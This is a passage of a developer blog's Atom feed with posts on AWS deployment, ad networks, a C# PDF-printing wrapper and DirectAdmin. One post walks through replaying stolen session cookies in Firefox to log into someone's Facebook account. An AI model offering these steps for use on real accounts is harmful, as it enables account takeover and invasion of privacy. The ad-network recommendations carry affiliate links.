class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DB_HOST=zzzzz<span class="selector-class">.xxxxxxxxxxxx</span><span class="selector-class">.ap-southeast-1</span><span class="selector-class">.rds</span><span class="selector-class">.amazonaws</span>.com</span><br></pre></td></tr></table></figure><h3 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h3><p>Now, the deployment is pretty simple <em>(assume you’re using git here)</em></p><p>In your local, <code>cd</code> to the project root, then run a command</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ eb deploy <span class="tag">&lt;<span class="name">environment</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It will deploy the latest commit, if you have any changes which not committed yet, it won’t be deployed.</p><h4 id="Mission-Completed"><a href="#Mission-Completed" class="headerlink" title="Mission Completed!!!"></a>Mission Completed!!!</h4><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="http://blog.goforyt.com/laravel-aws-elastic-beanstalk-dev-guide/">Laravel on AWS Elastic Beanstalk – Dev Guide</a></li><li><a href="http://www.lifeofguenter.de/2015/04/laravel-queues-with-supervisor-on.html">Laravel Queues with Supervisor on Elasticbeanstalk</a></li><li><a href="https://realpython.com/blog/python/deploying-a-django-app-to-aws-elastic-beanstalk/">Deploying a Django App to AWS Elastic Beanstalk</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Problem&quot;&gt;&lt;a href=&quot;#Problem&quot; class=&quot;headerlink&quot; title=&quot;Problem&quot;&gt;&lt;/a&gt;Problem&lt;/h2&gt;&lt;p&gt;This is my first time dealing with AWS.</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>Adsterra make my site traffic drop &amp;amp; get banned by Chrome</title>
    <link href="http://jslim.net/blog/2016/05/16/adsterra-make-my-site-traffic-drop-and-get-banned-by-chrome/"/>
    <id>http://jslim.net/blog/2016/05/16/adsterra-make-my-site-traffic-drop-and-get-banned-by-chrome/</id>
    <published>2016-05-16T23:21:15.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Today I would like to share with you, I had put Adsterra on this site. As they claimed that high CPM rate.</p><p>Right now, I notice that my site has blocked by Google Chrome.</p><p><img src="/images/posts/2016-05-17-adsterra-make-my-site-traffic-drop-and-get-banned-by-chrome/banned-chrome.png" alt="Banned by chrome"></p><p>I guess is because of, when first load the page, the first click will redirect to somewhere, this is really annoying also.</p><p>I found out there is a link about <em><strong>terraclick</strong></em>, and is from the javascript file that from Adsterra. So I remove it quickly.</p><p>Now, I check back my Google Analytics</p><p><img src="/images/posts/2016-05-17-adsterra-make-my-site-traffic-drop-and-get-banned-by-chrome/ga.png" alt="Google Analytics traffic drop"></p><p>The session drop until <strong>50+</strong>. If you still can see this post, I hope that you don’t simply trust all these claim about <em>high CPM</em> bla bla bla.</p><p>Use Google AdSense, otherwise use <a href="http://jsl.im/1oDPjDx">RevenueHits</a>. At lease I know that RevenueHits can make me some revenue, better than those scam Ads platform <em>(really make my site shit)</em>.</p><p><img src="/images/posts/2016-05-17-adsterra-make-my-site-traffic-drop-and-get-banned-by-chrome/revenuehits.png" alt="RevenueHits revenue"></p><p>My revenue drop also. Please review carefully before you apply any ads on your site.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Today I would like to share with you, I had put Adsterra on this site. As they claimed that high CPM rate.&lt;/p&gt;
&lt;p&gt;Right now, I notice</summary>
        
      
    
    
    
    
    <category term="banned" scheme="http://jslim.net/tags/banned/"/>
    
    <category term="scam" scheme="http://jslim.net/tags/scam/"/>
    
  </entry>
  
  <entry>
    <title>Session hijacking: facebook.com example</title>
    <link href="http://jslim.net/blog/2016/03/28/session-hijacking-facebook-dot-com-example/"/>
    <id>http://jslim.net/blog/2016/03/28/session-hijacking-facebook-dot-com-example/</id>
    <published>2016-03-28T18:55:13.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>First of all, <a href="https://en.wikipedia.org/wiki/Session_hijacking">session hijacking</a> is a technique that steal the cookies from authenticated user, and <em>lie</em> to the server that you’re the authenticated user.</p><p>I’m going to show an example on how to get into the facebook account.</p><p>Assumption: I already have the authenticated cookies on my hand.</p><h2 id="1-Open-facebook-com-with-Firefox"><a href="#1-Open-facebook-com-with-Firefox" class="headerlink" title="1. Open facebook.com with Firefox"></a>1. Open facebook.com with Firefox</h2><p>I still think that Firefox is the best browser ever for developer.</p><p><img src="/images/posts/2016-03-29-session-hijacking-facebook-dot-com-example/fb-before-login.png" alt="Firefox - facebook login page"></p><p>You can see the Facebook login page now. Now I need to import the cookies into here.</p><p>But before that, please download <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-manager/">Advanced Cookie Manager</a> plugin fo Firefox.</p><h2 id="2-Import-the-cookies-to-facebook-com"><a href="#2-Import-the-cookies-to-facebook-com" class="headerlink" title="2. Import the cookies to facebook.com"></a>2. Import the cookies to facebook.com</h2><p><img src="/images/posts/2016-03-29-session-hijacking-facebook-dot-com-example/cookie-manager-begin-edit.png" alt="Firefox plugin: Advanced cookie manager"></p><p>Go to <strong>Manage Cookies</strong> menu, select “facebook.com” in the <strong>Domain</strong> there. Now you can see a few cookies here.</p><p>See the box I highlighted? Facebook use <em>https</em>, so <em>httpOnly</em> choose <code>false</code>, <em>isSecure</em> choose <code>true</code> and <em>isSession</em> also <code>true</code>. These are session cookies.</p><p><img src="/images/posts/2016-03-29-session-hijacking-facebook-dot-com-example/added-all-cookie.png" alt="Advanced cookie manager with all session cookies"></p><p>Now will be like this.</p><h2 id="3-Successful-login"><a href="#3-Successful-login" class="headerlink" title="3. Successful login"></a>3. Successful login</h2><p>Refresh the page, and now…</p><p><img src="/images/posts/2016-03-29-session-hijacking-facebook-dot-com-example/login-successful.png" alt="Successful login"></p><p>DONE!</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The concept is like you want to go to foreign country, but you don’t have a passport. Now you <em>steal</em>/<em>get</em> the passport from someone <em>(ignore the passport photo, just an example here)</em>. Now you tell the custom that you’re actually the <em>someone</em>, and you’ll get pass.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;First of all, &lt;a href=&quot;https://en.wikipedia.org/wiki/Session_hijacking&quot;&gt;session hijacking&lt;/a&gt; is a technique that steal the cookies from</summary>
        
      
    
    
    
    
    <category term="hacking" scheme="http://jslim.net/tags/hacking/"/>
    
    <category term="session-hijacking" scheme="http://jslim.net/tags/session-hijacking/"/>
    
  </entry>
  
  <entry>
    <title>Web app with Windows app print pdf file from download link</title>
    <link href="http://jslim.net/blog/2016/03/07/web-app-with-windows-app-print-pdf-file-from-download-link/"/>
    <id>http://jslim.net/blog/2016/03/07/web-app-with-windows-app-print-pdf-file-from-download-link/</id>
    <published>2016-03-07T23:16:53.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>A web app that allow user to click on a link/button, then trigger the selected printer and print out the document directly.</p><h2 id="Problem-amp-Solution"><a href="#Problem-amp-Solution" class="headerlink" title="Problem &amp; Solution"></a>Problem &amp; Solution</h2><p>Due to security reason, there is no way to trigger hardware via JavaScript.  Thus, I create a Windows Form Application <em>(WFA)</em> using C#.</p><p>This application is actually just a wrapper that wrap a browser <em>(I’m using <a href="https://github.com/cefsharp/CefSharp">CefSharp</a> browser)</em>, so that I can get the printer list by using C#, then pass to the browser.</p><h3 id="1-Create-a-Windows-Form-Application"><a href="#1-Create-a-Windows-Form-Application" class="headerlink" title="1. Create a Windows Form Application"></a>1. Create a Windows Form Application</h3><p>I assume you know how to do this. I’m using Visual Studio in this case.</p><p>Also, you need to add a few references that required for this project:</p><ul><li>System.configuration</li><li>System.Management</li><li>System.Web</li><li>System.Net.Http</li></ul><h3 id="2-Download-CefSharp-browser"><a href="#2-Download-CefSharp-browser" class="headerlink" title="2. Download CefSharp browser"></a>2. Download CefSharp browser</h3><p>You can <a href="https://www.nuget.org/packages/CefSharp.WinForms/">install CefSharp via Nuget</a></p><h3 id="3-Embed-into-your-main-form"><a href="#3-Embed-into-your-main-form" class="headerlink" title="3. Embed into your main form"></a>3. Embed into your main form</h3><p><strong>Foo.cs</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> CefSharp;</span><br><span class="line"><span class="keyword">using</span> CefSharp.WinForms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FooSpace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Foo</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> baseUrl = <span class="string">&quot;http://yoursite.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// session/cookie property</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> sessionCookieKey = <span class="string">&quot;PHPSESSID&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> sessionCookie = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ChromiumWebBrowser browser;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Foo</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            InitBrowser();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InitBrowser</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Cef.Initialize(<span class="keyword">new</span> CefSettings());</span><br><span class="line">            browser = <span class="keyword">new</span> ChromiumWebBrowser(Foo.baseUrl);</span><br><span class="line">            <span class="keyword">this</span>.Controls.Add(browser);</span><br><span class="line">            browser.Dock = DockStyle.Fill;</span><br><span class="line">            browser.FrameLoadStart += OnFrameLoadStart;</span><br><span class="line">            browser.FrameLoadEnd += OnFrameLoadEnd;</span><br><span class="line">            browser.DownloadHandler = <span class="keyword">new</span> FooDownloadHandler();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Chromium delegate</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnFrameLoadStart</span>(<span class="params"><span class="built_in">object</span> sender, FrameLoadStartEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// retrieve session cookie</span></span><br><span class="line">            <span class="keyword">var</span> visitor = <span class="keyword">new</span> CookieVisitor(all_cookies =&gt; &#123;</span><br><span class="line">                <span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">var</span> nameValue <span class="keyword">in</span> all_cookies)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// grab the session cookie</span></span><br><span class="line">                    <span class="keyword">if</span> (nameValue.Item1 == Foo.sessionCookieKey)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">this</span>.sessionCookie = nameValue.Item2;</span><br><span class="line">                        <span class="comment">// pass the session cookie to download handler</span></span><br><span class="line">                        ((FooDownloadHandler)browser.DownloadHandler).setSessionCookie(<span class="keyword">this</span>.sessionCookie);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            Cef.GetGlobalCookieManager().VisitAllCookies(visitor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Inject-printer-list-into-browser"><a href="#4-Inject-printer-list-into-browser" class="headerlink" title="4. Inject printer list into browser"></a>4. Inject printer list into browser</h3><p>Edit the same file <strong>Foo.cs</strong>, and add the following</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// after the page loaded, check if the url is setup printers page</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnFrameLoadEnd</span>(<span class="params"><span class="built_in">object</span> sender, FrameLoadEndEventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (e.Url.Contains(<span class="string">&quot;setup/printers&quot;</span>)) addPrinterOptionsToDropdown();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Javascript</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addPrinterOptionsToDropdown</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// (Optional) Filter a few printer model</span></span><br><span class="line">    Regex regex = <span class="keyword">new</span> Regex(<span class="string">@&quot;\b(EPSON|Canon)\b&quot;</span>, RegexOptions.IgnoreCase);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> js = <span class="string">&quot;$(&#x27;select&#x27;).empty();&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> sPrinters <span class="keyword">in</span> System.Drawing.Printing.PrinterSettings.InstalledPrinters)</span><br><span class="line">    &#123;</span><br><span class="line">        MatchCollection matches = regex.Matches(sPrinters);</span><br><span class="line">        <span class="keyword">if</span> (matches.Count &lt; <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        js += <span class="string">&quot;\n$(&#x27;select&#x27;).append($(&#x27;&lt;option&gt;&#x27;).val(&#x27;&quot;</span> + sPrinters + <span class="string">&quot;&#x27;).text(&#x27;&quot;</span> + sPrinters + <span class="string">&quot;&#x27;));&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    js += <span class="string">&quot;\n$(&#x27;select&#x27;).each(function(i) &#123;&quot;</span></span><br><span class="line">        + <span class="string">&quot;\n  $(this).val($(this).data(&#x27;value&#x27;));&quot;</span></span><br><span class="line">        + <span class="string">&quot;\n&#125;);&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    browser.ExecuteScriptAsync(js);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Create-a-download-handler-class"><a href="#5-Create-a-download-handler-class" class="headerlink" title="5. Create a download handler class"></a>5. Create a download handler class</h3><p><strong>FooDownloadHandler.cs</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Drawing.Printing;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">FooDownloadHandler</span> : <span class="title">IDownloadHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> sessionCookie = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> suggestedFilename = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// without the session, the file cannot be downloaded</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSessionCookie</span>(<span class="params"><span class="built_in">string</span> sessionCookie</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.sessionCookie = sessionCookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnBeforeDownload</span>(<span class="params">IBrowser browser, DownloadItem downloadItem, IBeforeDownloadCallback callback</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!callback.IsDisposed)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (callback)</span><br><span class="line">            &#123;</span><br><span class="line">                callback.Continue(downloadItem.SuggestedFileName, showDialog: <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Webclient delegate</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">client_DownloadProgressChanged</span>(<span class="params"><span class="built_in">object</span> sender, DownloadProgressChangedEventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// download in progress</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">client_DownloadFileCompleted</span>(<span class="params"><span class="built_in">object</span> sender, AsyncCompletedEventArgs e</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// download completed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now if you try to download, it will prompt a “Save as” windows and you can choose where you want to save.</p><h3 id="6-Install-3rd-party-pdf-reader"><a href="#6-Install-3rd-party-pdf-reader" class="headerlink" title="6. Install 3rd-party pdf reader"></a>6. Install 3rd-party pdf reader</h3><p>I’m using <a href="https://www.foxitsoftware.com/products/pdf-reader/">Foxit</a> here, download it and install in the Windows machine <em>(client)</em>.</p><h3 id="7-Pass-the-downloaded-document-to-selected-printer"><a href="#7-Pass-the-downloaded-document-to-selected-printer" class="headerlink" title="7. Pass the downloaded document to selected printer"></a>7. Pass the downloaded document to selected printer</h3><p>Edit the file <strong>FooDownloadHandler.cs</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create printer name property</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> printerName = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add handler</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnBeforeDownload</span>(<span class="params">IBrowser browser, DownloadItem downloadItem, IBeforeDownloadCallback callback</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Directory.CreateDirectory(Path.GetTempPath());</span><br><span class="line">    <span class="keyword">this</span>.suggestedFilename = Path.Combine(Path.GetTempPath(), downloadItem.SuggestedFileName);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// the printer name is passed from the web app thru query string</span></span><br><span class="line">    <span class="built_in">string</span> querystring = downloadItem.Url.Substring(downloadItem.Url.IndexOf(<span class="string">&#x27;?&#x27;</span>));</span><br><span class="line">    System.Collections.Specialized.NameValueCollection queryDictionary = System.Web.HttpUtility.ParseQueryString(querystring);</span><br><span class="line">    <span class="keyword">if</span> (queryDictionary.Get(<span class="string">&quot;printer&quot;</span>) != <span class="literal">null</span> &amp;&amp; queryDictionary.Get(<span class="string">&quot;printer&quot;</span>) != <span class="string">&quot;&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.printerName = queryDictionary.Get(<span class="string">&quot;printer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!callback.IsDisposed) <span class="comment">// without printer name, will prompt &quot;Save as&quot; window</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">using</span> (callback)</span><br><span class="line">        &#123;</span><br><span class="line">            callback.Continue(downloadItem.SuggestedFileName, showDialog: <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use WebClient to download</span></span><br><span class="line">    WebClient client = <span class="keyword">new</span> WebClient();</span><br><span class="line">    client.Headers.Add(HttpRequestHeader.Cookie, Foo.sessionCookieKey + <span class="string">&quot;=&quot;</span> + <span class="keyword">this</span>.sessionCookie);</span><br><span class="line">    client.DownloadProgressChanged += <span class="keyword">new</span> DownloadProgressChangedEventHandler(client_DownloadProgressChanged);</span><br><span class="line">    client.DownloadFileCompleted += <span class="keyword">new</span> AsyncCompletedEventHandler(client_DownloadFileCompleted);</span><br><span class="line">    client.DownloadFileAsync(<span class="keyword">new</span> Uri(downloadItem.Url), <span class="keyword">this</span>.suggestedFilename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">client_DownloadFileCompleted</span>(<span class="params"><span class="built_in">object</span> sender, AsyncCompletedEventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printPDF(<span class="keyword">this</span>.suggestedFilename, <span class="keyword">this</span>.printerName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">printPDF</span>(<span class="params"><span class="built_in">string</span> filename, <span class="built_in">string</span> printerName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> exeFile = <span class="string">@&quot;&quot;&quot;C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitReader.exe&quot;&quot;&quot;</span>;</span><br><span class="line">        ProcessStartInfo processInfo = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">        processInfo.FileName = <span class="string">&quot;\&quot;&quot;</span> + exeFile + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">        processInfo.Arguments = <span class="string">&quot;/t \&quot;&quot;</span> + filename + <span class="string">&quot;\&quot; \&quot;&quot;</span> + printerName + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">        processInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">        processInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">        processInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">        processInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> process = Process.Start(processInfo);</span><br><span class="line"></span><br><span class="line">        process.OutputDataReceived += (<span class="built_in">object</span> sender, DataReceivedEventArgs e) =&gt;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;output&gt;&gt;&quot;</span> + e.Data);</span><br><span class="line">        process.BeginOutputReadLine();</span><br><span class="line"></span><br><span class="line">        process.ErrorDataReceived += (<span class="built_in">object</span> sender, DataReceivedEventArgs e) =&gt;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;error&gt;&gt;&quot;</span> + e.Data);</span><br><span class="line">        process.BeginErrorReadLine();</span><br><span class="line"></span><br><span class="line">        process.WaitForExit();</span><br><span class="line">        process.Close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(ex.Message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// after print, delete the temporary file</span></span><br><span class="line">        File.Delete(filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy it!</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;Scenario&quot;&gt;&lt;a href=&quot;#Scenario&quot; class=&quot;headerlink&quot; title=&quot;Scenario&quot;&gt;&lt;/a&gt;Scenario&lt;/h2&gt;&lt;p&gt;A web app that allow user to click on a</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="windows-form-application" scheme="http://jslim.net/tags/windows-form-application/"/>
    
  </entry>
  
  <entry>
    <title>A better alternative for AdSense</title>
    <link href="http://jslim.net/blog/2016/02/25/a-better-alternative-for-adsense/"/>
    <id>http://jslim.net/blog/2016/02/25/a-better-alternative-for-adsense/</id>
    <published>2016-02-25T20:14:31.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Previously, I was using AdSense for some time, but the earning seems not that attractive. Until, I discover <a href="http://jsl.im/1oDPjDx">RevenueHits</a>, within 4 months, I received my first payment, USD25.50.</p><p><img src="/images/posts/2016-02-26-a-better-alternative-for-adsense/montly-earning.png" alt="RevenueHits - Montly earning"></p><p><img src="/images/posts/2016-02-26-a-better-alternative-for-adsense/paypal-payment.png" alt="Received Paypal payment"></p><p>Awesome! You can sign up here.</p><a href="http://jsl.im/1oDPjDx">    <img src="/images/posts/2016-02-26-a-better-alternative-for-adsense/revenuehits.png" alt="RevenueHits" /></a>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Previously, I was using AdSense for some time, but the earning seems not that attractive. Until, I discover &lt;a</summary>
        
      
    
    
    
    
    <category term="ads-platform" scheme="http://jslim.net/tags/ads-platform/"/>
    
  </entry>
  
  <entry>
    <title>Change document root in DirectAdmin</title>
    <link href="http://jslim.net/blog/2016/02/23/change-document-root-in-directadmin/"/>
    <id>http://jslim.net/blog/2016/02/23/change-document-root-in-directadmin/</id>
